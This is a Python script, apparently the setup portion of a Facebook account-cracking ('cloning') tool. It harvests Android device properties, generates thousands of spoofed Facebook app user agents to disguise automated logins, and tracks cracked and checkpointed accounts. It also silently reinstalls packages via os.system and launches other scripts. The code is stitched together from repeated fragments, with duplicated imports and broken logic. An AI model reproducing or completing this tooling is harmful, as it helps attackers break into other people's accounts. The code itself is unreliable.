
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
from os import path
import os,base64,zlib,pip,urllib
os.system("pip uninstall urllib3 requests chardet idna certifi -y && pip install urllib3 requests chardet idna certifi")

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print('\n Installing missing modules ...')
	os.system('pip install requests futures==2 > /dev/null')
		
except:pass
		
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
		fbcr = ['Jazz','Zong','Telenor','Ufone','Ptcl','CMPak','Warid','SCO','Airtel','Jio','Banglalink','Grameenphone','Robi','TeleTalk']
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=1.5,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
		total = 0
		for i in fbcr:
				total+=1
		select = ('1','2')
		if select == '1':
				fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
				sim_id+=fbcr
		elif select == '2':
				try:
						fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
						sim_id+=fbcr
				except Exception as e:
						fbcr = ['Jazz','Zong','Telenor','Ufone','Ptcl','CMPak','Warid','SCO','Airtel','Jio','Banglalink','Grameenphone','Robi','TeleTalk']
						sim_id+=fbcr
		else:
				fbcr = ['Jazz','Zong','Telenor','Ufone','Ptcl','CMPak','Warid','SCO','Airtel','Jio','Banglalink','Grameenphone','Robi','TeleTalk']
				sim_id+=fbcr
except:
		fbcr = ['Jazz','Zong','Telenor','Ufone','Ptcl','CMPak','Warid','SCO','Airtel','Jio','Banglalink','Grameenphone','Robi','TeleTalk']
device = {
		'android_version':android_version,
		'model':model,
		'build':build,
		'fblc':fblc,
		'fbmf':fbmf,
		'fbbd':fbbd,
		'fbdv':model,
		'fbsv':fbsv,
		'fbca':fbca,
		'fbdm':fbdm}
import os,base64,zlib,pip,urllib,subprocess
import requests
import random
import uuid
import string
import hashlib
import json

try:
		import os,requests,json,time,re,random,sys,uuid,string,subprocess
		from string import *
		from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
		print('\n Installing missing modules ...')
		os.system('pip install requests futures==2 > /dev/null')
		
except:pass
from uuid import uuid4
import os,sys,tempfile,string,random,subprocess,uuid


try:
		import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
		from string import *

		from concurrent.futures import ThreadPoolExecutor as ThreadPool
		
except Exception as e:
		print(e)
		print('\n Installing modules wait !')
		os.system('pip install futures==2 && python jan.py')
except FileExistsError:
		os.system('clear')
		pass

try:
		import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
		from string import *
		from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
		print('\n Installing missing modules ...')
		os.system('pip install requests futures==2 > /dev/null')
		



from os import path
import os,base64,zlib,pip,urllib


try:
		import os,requests,json,time,re,random,sys,uuid,string,subprocess
		from string import *
		from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
		print('\n Installing missing modules ...')
		os.system('pip install requests futures==2 > /dev/null')
		
except:pass
		
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
		fbcr = 'Jazz'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=1.5,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
		total = 0
		for i in fbcr:
				total+=1
		select = ('1','2')
		if select == '1':
				fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
				sim_id+=fbcr
		elif select == '2':
				try:
						fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
						sim_id+=fbcr
				except Exception as e:
						fbcr = "Jazz"
						sim_id+=fbcr
		else:
				fbcr = 'Jazz'
				sim_id+=fbcr
except:
		fbcr = "Jazz"
device = {
		'android_version':android_version,
		'model':model,
		'build':build,
		'fblc':fblc,
		'fbmf':fbmf,
		'fbbd':fbbd,
		'fbdv':model,
		'fbsv':fbsv,
		'fbca':fbca,
		'fbdm':fbdm}
	
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")


import os,base64,zlib,pip,urllib,subprocess
import requests
import random
import uuid
import string
import hashlib
import json

try:
		import os,requests,json,time,re,random,sys,uuid,string,subprocess
		from string import *
		from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
		print('\n Installing missing modules ...')
		os.system('pip install requests futures==2 > /dev/null')
		os.system('python SHAZIA.py')
except:pass

import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,uuid,string
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'#
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
S = '\x1b[1;97m' # 
A = "\x1b[38;5;208m" #
R = "\x1b[38;5;46m"  #
F = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
I = '\x1b[1;97m' # 
Z = '\x1b[1;97m' # 
H = '\x1b[1;97m' #
N = '\x1b[0m'	#
O = '\x1b[1;97m' #
P = '\x1b[1;97m' #
M='\x1b[1;97m'
my_color = [
 S, A, R, F, B, I, Z, N, O,H,M,P]
warna = random.choice(my_color)
import os,sys,time,json,random,re,string,platform,base64,uuid
from rich import pretty 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64

try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool 
except ModuleNotFoundError:
	os.system('pip install --upgrade pip && pip install requests futures==2 > /dev/null')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	import device 
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,android_version,device
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	#os.system('pip install dnslib pypi')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	
import os

try:

	import requests

except ImportError:

	print('\n Installing missing modules ...')

	os.system('pip install requests')

try:

	import concurrent.futures 

except ImportError:

	print('\n Installing missing modules ...')

	os.system('pip install futures')

try:

	import bs4

except ImportError:

	print('\n Installing missing modules ...')

	os.system('pip install bs4')

import requests, os, re, bs4, sys, uuid, json, time, random, datetime, subprocess 

from concurrent.futures import ThreadPoolExecutor as YayanGanteng

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

	if n < 0 or n > 12:

		exit()

	nTemp = n - 1

except ValueError:

	exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

waktu = '%s %s %s'%(ha,op,ta)

waktu.split('/')

### WARNA RANDOM ###

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'	# WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

############################ RESPONSE FACEBOOK ###########################################

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,pwBaru=[],[]
loop = 0
oks = []
cps = []
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
loop = 0
Apk = []
oks = []
cps = []
Apk = []
ugen = []
ugen2 = []
ok = []

cp = []

id = []

user = []

loop = 0
loop = 0
ok = []
methods = []
total=[]
clone_type=[]
android_models = []
hh = ['[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=1.5,width=800,height=480};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=1.5,width=800,height=480};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.5,width=800,height=480};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=1.5,width=800,height=480};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']
mod = ['GT-I9190', 'KOT49H', 'GT-I9192', 'KOT49H', 'GT-I9300I', 'KTU84P', 'GT-I9300', 'IMM76D', 'GT-I9300', 'JSS15J', 'GT-I9301I', 'KOT4', 'GT-I9301I', 'KOT49H', 'GT-I9500', 'JDQ39', 'GT-I9500', 'LRX22C', 'GT-N5100', 'JZO54K', 'GT-N7100', 'KOT49H', 'GT-N8000', 'JZO54K', 'GT-N8000', 'KOT49H', 'GT-P3110', 'JZO54K', 'GT-P5100', 'IML74K', 'GT-P5100', 'JDQ', 'GT-P5100', 'JDQ39', 'GT-P5100', 'JZO54K', 'GT-P5110', 'JDQ39', 'GT-P5200', 'KOT49H', 'GT-P5210', 'KOT49H', 'GT-P5220', 'JDQ39', 'GT-S7390', 'JZO54K', 'SAMSUNG', 'SM-A500F', 'SAMSUNG', 'SM-G532F', 'SAMSUNG', 'SM-G920F', 'SAMSUNG', 'SM-G935F', 'SAMSUNG', 'SM-J320F', 'SAMSUNG', 'SM-J510FN', 'SAMSUNG', 'SM-N920S', 'SAMSUNG', 'SM-T280', 'SM-A500FU', 'MMB29M', 'SM-A500F', 'LRX22G', 'SM-A500F', 'MMB29M', 'SM-A500H', 'MMB29M', 'SM-G900F', 'KOT49H', 'SM-G920F', 'MMB29K', 'SM-G920F', 'NRD90M', 'SM-G930F', 'NRD90M', 'SM-G935F', 'MMB29K', 'SM-G935F', 'NRD90M', 'SM-G950F', 'NRD90M', 'SM-J320FN', 'LMY47V', 'SM-J320F', 'LMY4', 'SM-J320F', 'LMY47V', 'SM-J320H', 'LMY47V', 'SM-J320M', 'LMY47V', 'SM-J510FN', 'MMB29M', 'SM-J510FN', 'NMF2', 'SM-J510FN', 'NMF26X', 'SM-J510FN', 'NMF26X;', 'SM-J701F', 'NRD90M;', 'SM-T111', 'JDQ39', 'SM-T230', 'KOT49H', 'SM-T231', 'KOT49H', 'SM-T235', 'KOT4SM-T310', 'KOT49H', 'SM-T311', 'KOT4', 'SM-T311', 'KOT49H', 'SM-T315', 'JDQ39', 'SM-T525', 'KOT49H', 'SM-T531', 'KOT49H', 'SM-T531', 'LRX22G', 'SM-T535', 'LRX22G', 'SM-T555', 'LRX22G', 'SM-T561', 'KTU84P', 'SM-T705', 'LRX22G', 'SM-T705', 'LRX22G', 'SM-T805', 'LRX22G', 'SM-T820', 'NRD90M', 'SPH-L720', 'KOT49H']



for z in range(5000):
	versi_android = str(random.randint(4,12))+".0.1"
	rr = random.randint
	rc = random.choice
	xio = str(random.randint(4,12))+".0.0"
	android = str(random.randint(4,12))
	versi_chrome = str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	device_oppo = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
	device_vivo = random.choice(["vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935"])
	device_samsung = random.choice(["SM-G975F","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
	device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
	device_sony = random.choice(["E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322"])
	device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
	device_realme = random.choice(["RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
	h_sony = random.choice(["A","B","C"])
	dev = device_oppo.split(" Build/")[0]
	density = random.choice(["{density=3.0,width=720,height=1280};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.75,width=1080,height=2028};FB_FW/1;]"])
	jkj = str(random.randint(11111111,99999999))
	jka = str(random.randint(200600,200999))
	jkb = str(random.randint(4,13))
	jkc = str(random.randint(20000000,99999999))
	opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
	oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
	mco = random.choice(["en_GB","en_US","es_MX","th_TH","pl_PL"])
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.randint(10,90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua_v = f"Mozilla/5.0 (Linux; Android {xio}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(3400,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200,700))}.0.0.{str(rr(10,30))}.{str(rr(30,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/vivo;FBBD/vivo;FBDV/{device_vivo};FBSV/{versi_android};FBOP/16]"
	ua_s = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(5000,5999))}.{str(rr(10,100))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(700,999))}.0.0.{str(rr(100,200))}.{str(rr(200,350))};]"
	ua_o = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]"
	ua_r = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]"
	ua_d = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000,229999))}.0{str(rr(1,30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,130))}.0.{str(rr(5000,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90,600))}.0.0.{str(rr(1,30))}.{str(rr(100,150))};]"
	ua_x = f"Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300,600))}.0.0.{str(rr(10,90))}.{str(rr(100,150))};FBBV/{str(rr(200000000,299999999))};WV;FBDM/"+"{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]"
	uaku = str(([ua_v,ua_x]))
	ugen.append(uaku)








import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python random.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
url_lookup = "https://lookup-id.com/"

url_mb = "https://p.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
SHAZIA =[
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27',]

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00FF00"
except FileNotFoundError:
	color_table = "#00FF00"
#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
